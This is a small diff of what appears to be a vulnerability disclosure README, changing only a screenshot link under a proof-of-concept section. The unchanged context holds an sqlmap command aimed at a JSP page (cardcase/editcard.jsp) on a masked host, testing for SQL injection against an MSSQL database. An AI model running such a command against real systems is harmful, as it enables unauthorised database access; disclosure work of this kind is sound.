@@ -19,5 +19,6 @@ poc:
 python .\sqlmap.py -u "http://xx.xx.xx.xx:8081/cardcase/editcard.jsp?person_id=2&id=1&classid=1" --random-agent --dbms=mssql
 
 
-![sql](https://github.com/user-attachments/assets/350e443e-b01b-44a8-87b1-439f0c19d60b)
+![sql](https://github.com/user-attachments/assets/7fcdcd69-5cfb-4088-baf7-7172e638fa53)
+
 
